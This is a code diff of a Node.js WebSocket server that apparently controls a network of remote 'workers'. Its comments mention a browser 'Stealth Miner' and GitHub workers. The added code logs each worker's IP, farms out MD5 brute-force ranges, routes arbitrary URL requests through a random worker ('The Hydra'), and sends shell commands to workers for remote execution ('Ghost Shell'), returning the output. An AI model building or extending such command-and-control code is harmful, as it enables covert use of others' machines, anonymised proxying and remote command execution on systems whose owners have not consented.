@@ -7,32 +7,47 @@ const path = require('path');
 // --- CONFIGURATION ---
 const PORT = process.env.PORT || 3000;
 
-// --- MINING STATE (The "Brain") ---
+// --- ADVANCED MINING STATE ---
+// We now use a Map to store detailed stats for every worker
+// Key: WebSocket Connection | Value: { id, ip, role, lastSeen }
+let workers = new Map(); 
+let clients = new Set();    // Dashboard connections
+
 let searchRange = 0;
-const RANGE_SIZE = 100000; // Each worker checks 100k numbers per job
+const RANGE_SIZE = 100000;
+let totalHashes = 0;
 let foundGoldenTicket = null;
-let workers = new Set();    // Set of active WebSocket connections (GitHub/Browsers)
-let clients = new Set();    // Set of active Dashboards (You)
-let totalHashes = 0;        // Global counter of work done
 
 const app = express();
 app.use(cors());
 const server = http.createServer(app);
 const wss = new Server({ server });
 
-// --- HTTP ROUTES ---
-// 1. The SysAdmin Dashboard
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
+// Helper: Generate cool Unit IDs (e.g., UNIT-A7X9)
+function generateId() {
+    return 'UNIT-' + Math.random().toString(36).substr(2, 4).toUpperCase();
+}
 
-// 2. The Stealth Miner (for browsers)
-app.get('/join', (req, res) => {
-    res.sendFile(path.join(__dirname, 'miner.html'));
-});
+// --- HTTP ROUTES ---
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
+app.get('/join', (req, res) => res.sendFile(path.join(__dirname, 'miner.html')));
 
 // --- WEBSOCKET LOGIC ---
-wss.on('connection', (ws) => {
+wss.on('connection', (ws, req) => {
+    
+    // 1. Assign Identity immediately upon connection
+    const id = generateId();
+    // Get IP (handles Render/Heroku proxies or direct localhost)
+    const ipRaw = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const ip = ipRaw ? ipRaw.split(',')[0] : 'Unknown';
+
+    // 2. Register in Database as IDLE initially
+    workers.set(ws, { 
+        id: id, 
+        ip: ip, 
+        role: 'CONNECTING', 
+        status: 'Online' 
+    });
 
     ws.on('message', (message) => {
         try {
@@ -44,115 +59,141 @@ wss.on('connection', (ws) => {
     });
 
     ws.on('close', () => {
+        // Remove from tracking when they disconnect
         workers.delete(ws);
         clients.delete(ws);
-        // We don't log every disconnect to keep logs clean
         broadcastStats();
     });
 });
 
 // --- CORE SYSTEM LOGIC ---
 function handleMessage(ws, data) {
+    // Retrieve the worker's metadata
+    const worker = workers.get(ws);
+
     switch (data.type) {
 
-        // A Worker (GitHub or Browser) reports for duty
+        // --- REGISTRATION ---
         case 'REGISTER_WORKER':
-            workers.add(ws);
-            console.log('New Worker Joined! Assigning task...');
-            sendJob(ws); // Give them work immediately
+            if (worker) {
+                worker.role = 'MINING'; // Default job
+                worker.type = 'NODE';   // Mark as a compute node
+            }
+            console.log(`[${worker ? worker.id : '?'}] Reported for duty.`);
+            sendJob(ws);
             broadcastStats();
             break;
 
-        // The Dashboard connects to watch
         case 'REGISTER_CLIENT':
             clients.add(ws);
+            // Clients (Dashboards) should not appear in the Worker Grid
+            workers.delete(ws); 
             broadcastStats();
             break;
 
-        // A Worker finished a range
+        // --- MINING / CRACKING ---
         case 'JOB_COMPLETE':
-            // 1. Record the work done
+            // Update stats
             totalHashes += RANGE_SIZE;
+            if (worker) worker.role = 'MINING'; // Ensure status is correct
 
-            // 2. Did they find the Golden Ticket?
             if (data.solution) {
                 foundGoldenTicket = data.solution;
                 console.log("!!! GOLDEN TICKET FOUND: " + data.solution);
-                broadcastStats(); // Tell everyone the good news
             }
 
-            // 3. Give them the next chunk of work (if we haven't stopped)
+            // Keep grinding if not found
             if (!foundGoldenTicket) {
                 sendJob(ws);
             }
             broadcastStats();
             break;
 
-        // 4. Client wants to proxy a request
+        // --- PROXY (The Hydra) ---
         case 'SEND_PROXY_CMD':
-            // Pick a random worker
-            const workerArray = Array.from(workers);
-            if (workerArray.length > 0) {
-                const randomWorker = workerArray[Math.floor(Math.random() * workerArray.length)];
+            // 1. Pick a random worker from the Map
+            const workerList = Array.from(workers.keys());
+            if (workerList.length > 0) {
+                const targetWs = workerList[Math.floor(Math.random() * workerList.length)];
+                const targetMeta = workers.get(targetWs);
+                
+                // Update status to show they are busy
+                if (targetMeta) {
+                    targetMeta.role = 'PROXYING';
+                    broadcastStats();
+                }
 
-                randomWorker.send(JSON.stringify({
+                targetWs.send(JSON.stringify({
                     type: 'HTTP_PROXY',
                     url: data.url,
                     requestId: Date.now()
                 }));
-                console.log(`Routed proxy request for ${data.url}`);
             }
             break;
 
-        // 5. Worker returns the proxy result
         case 'PROXY_RESULT':
-             // Forward result to ALL dashboards (simple broadcast)
-             clients.forEach(c => c.send(JSON.stringify({
-                 type: 'PROXY_LOG',
-                 data: data
-             })));
+            // Forward result to Dashboards
+            clients.forEach(c => c.send(JSON.stringify({ type: 'PROXY_LOG', data: data })));
+            
+            // Reset worker status to Mining after a brief moment
+            if (worker) {
+                setTimeout(() => { 
+                    if (workers.has(ws)) { // Check if still connected
+                        worker.role = 'MINING'; 
+                        broadcastStats();
+                    }
+                }, 1000);
+            }
+            break;
+
+        // --- SHELL (Ghost Shell) ---
+        case 'SEND_SHELL_CMD':
+            const shellWorkers = Array.from(workers.keys());
+            if (shellWorkers.length > 0) {
+                const target = shellWorkers[0]; // Pick first available
+                target.send(JSON.stringify({ type: 'EXEC_CMD', command: data.command }));
+            }
+            break;
+
+        case 'SHELL_RESULT':
+             clients.forEach(c => c.send(JSON.stringify({ type: 'SHELL_LOG', output: data.output })));
              break;
     }
 }
 
 function sendJob(ws) {
-    // If we already found the ticket, tell workers to stop/relax
     if (foundGoldenTicket) {
         ws.send(JSON.stringify({ type: 'STOP', solution: foundGoldenTicket }));
         return;
     }
 
-    // Assign the next range
     const start = searchRange;
     const end = searchRange + RANGE_SIZE;
-    searchRange += RANGE_SIZE; // Move the global pointer forward
+    searchRange += RANGE_SIZE;
 
+    // Sending the MD5 Cracking Job (Target: "1234")
     ws.send(JSON.stringify({
         type: 'MINING_JOB',
         start: start,
         end: end,
-        target: '81dc9bdb52d04dc20036dbd8313ed055' // The difficulty (Hash must start with 5 zeros)
+        target: '81dc9bdb52d04dc20036dbd8313ed055' 
     }));
 }
 
 function broadcastStats() {
-    // Send data to all connected Dashboards
+    // Convert Map values to an Array for the frontend
+    const workerArray = Array.from(workers.values());
+
     const stats = JSON.stringify({
         type: 'STATS',
-        workers: workers.size,
-        totalHashes: totalHashes,       // This will make the number climb
-        tasksLeft: foundGoldenTicket ? 0 : 9999, // Just for the progress bar visual
+        workers: workerArray, // Sending full object list now
+        totalHashes: totalHashes,
         goldenTicket: foundGoldenTicket
     });
 
     clients.forEach(client => {
-        if (client.readyState === 1) { // Ensure connection is open
-            client.send(stats);
-        }
+        if (client.readyState === 1) client.send(stats);
     });
 }
 
-// --- START ENGINE ---
-server.listen(PORT, () => {
-    console.log(`Mining Brain Online on port ${PORT}`);
-});
+server.listen(PORT, () => console.log(`Watchtower Online on ${PORT}`));
